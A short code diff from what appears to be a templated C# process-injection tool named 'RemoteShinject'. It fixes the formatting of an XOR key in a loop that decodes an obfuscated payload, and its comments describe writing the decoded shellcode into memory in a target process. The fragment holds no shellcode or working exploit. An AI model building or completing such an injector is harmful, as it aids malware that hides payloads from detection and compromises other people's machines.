@@ -153,7 +153,7 @@ namespace RemoteShinject
                 // Apply XOR decryption with key {{ xor_key }} to reveal actual payload
                 for (int j = 0; j < buf.Length; j++)
                 {
-                    buf[j] = (byte)((uint)buf[j] ^ {{ xor_key }});
+                    buf[j] = (byte)((uint)buf[j] ^ 0x{{ xor_key }});
                 }
 
                 // Step 4: Write decoded shellcode to allocated memory in target process
